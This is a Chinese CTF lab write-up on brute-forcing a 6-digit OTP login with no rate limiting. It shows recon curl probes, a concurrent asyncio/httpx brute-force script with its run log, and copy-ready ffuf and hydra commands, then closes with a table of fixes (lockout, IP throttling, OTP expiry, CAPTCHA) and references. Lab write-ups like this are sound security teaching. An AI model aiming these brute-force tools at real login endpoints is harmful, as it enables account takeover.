# 36 · logic-otp-no-limit

> 6 位 OTP + `/verify` 无任何防御（无失败计数 / 无锁 / 无 IP 限速 / 无过期 / 无 CAPTCHA）
> → 10^6 空间在分钟级被在线爆破。

- 靶机：`http://目标地址`
- 目标：让 `admin` 通过 OTP 登录，拿到首页 `<pre>` 中的 flag。
- 本次结果：`OTP=424030`，`FLAG=TOGOGO-flag{}`

---

## 1. 摸接口（30 秒）

```bash
# 登录页（看到表单字段：username / otp）
curl -s http://目标地址/ | grep -E 'form|input'

# 试一次错误 OTP，观察响应
curl -i -s -X POST http://目标地址/verify \
     -d 'username=admin&otp=000000'
# HTTP/1.1 401 UNAUTHORIZED   →   body: wrong otp
```

## 2. 验证「无防御」（10 秒）

连发 30 次错误请求，确认没有 429 / 锁账 / CAPTCHA：

```bash
for i in $(seq 1 30); do
  curl -s -o /dev/null -w '%{http_code} ' \
       -X POST http://目标地址/verify \
       -d "username=admin&otp=$(printf '%06d' $i)"
done; echo
# 输出全是 401 → 直接上爆破
```

## 3. 命中信号

- 失败：`401` + body `wrong otp`
- 成功：`/verify` 返回 `302 → /`；follow_redirects 后 `200` 且 body 含 `flag{`

所以判定条件就一行：

```python
if r.status_code == 200 and "flag{" in r.text.lower():
    print("HIT", otp); print(r.text)
```

## 4. 爆破脚本（200 并发，asyncio + httpx）

完整脚本见同目录 `main.py`，核心逻辑 20 行：

```python
import asyncio, httpx, random, time
BASE = "http://目标地址"; CONC = 200
found = asyncio.Event(); hit = {}

async def one(c, sem, n):
    if found.is_set(): return
    otp = f"{n:06d}"
    async with sem:
        r = await c.post(f"{BASE}/verify",
                         data={"username":"admin","otp":otp},
                         follow_redirects=True)
    if r.status_code == 200 and "flag{" in r.text.lower():
        hit["otp"], hit["body"] = otp, r.text; found.set()

async def main():
    order = list(range(1_000_000)); random.shuffle(order)   # 随机次序，期望提早命中
    sem = asyncio.Semaphore(CONC)
    limits = httpx.Limits(max_connections=CONC, max_keepalive_connections=CONC)
    async with httpx.AsyncClient(limits=limits, timeout=15) as c:
        tasks = []
        for n in order:
            if found.is_set(): break
            tasks.append(asyncio.create_task(one(c, sem, n)))
            if len(tasks) >= CONC*4:
                _, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending)
        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
    print(hit)

asyncio.run(main())
```

运行：

```bash
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate
cd /Users/zlux/Project/Active/gkdctf/36-logic-otp-no-limit
nohup python3 -u main.py > brute.log 2>&1 & disown
tail -f brute.log
```

实战日志（节选）：

```
[  2000]   3.0s rate=669/s try=601741
[100000] 144s rate=697/s try=...
[776000]1386s rate=560/s try=819031
[+] HIT otp=424030
[+] FLAG = TOGOGO-flag{}
```

23 分钟、77.6 万次请求命中（运气偏右，期望 ~13 分钟）。

## 5. 手工复刻（不想写脚本就照抄）

```bash
# A) 用 ffuf 跑（最简单），生成 0~999999 的 6 位 OTP 字典
seq -f "%06g" 0 999999 > /tmp/otp.txt
ffuf -w /tmp/otp.txt:OTP \
     -u http://目标地址/verify \
     -X POST -d 'username=admin&otp=OTP' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -fc 401 -t 100        # 过滤 401，命中行会停下来
```

```bash
# B) hydra 写法（自动 6 位数字）
hydra -l admin -x 6:6:1 -t 64 目标地址 -s 34950 http-post-form \
      "/verify:username=^USER^&otp=^PASS^:wrong otp"
```

```bash
# C) 命中后用浏览器直接验证（拿到 OTP 后）
curl -i -s -X POST http://目标地址/verify \
     -d 'username=admin&otp=424030' -c /tmp/c.txt
curl -s -b /tmp/c.txt http://目标地址/ | grep flag
```

## 6. 漏洞要点 & 修复

| 缺失防御 | 应有实现 |
|---|---|
| 失败计数 | Redis `INCR login_fail:{user} EX 1800` |
| 账号锁定 | 失败 5 次锁 30 分钟 |
| IP 限速 | 同 IP `/verify` ≤ 5/min（429 + Retry-After） |
| OTP 过期 | 5 分钟过期 + 一次性消费 |
| CAPTCHA | 失败 ≥ 3 次后强制 |

一句话：**任何 OTP / PIN 接口必须叠「账户锁 + IP 限速 + OTP 生命周期」三层**，否则 4/6 位数字都能分钟级被爆破。

- 对应：OWASP API4:2023 Unrestricted Resource Consumption / CWE-307。
- 真实案例：Instagram 2019（$30k）、Facebook 2013（$20k）、Uber 2015 2FA bypass。
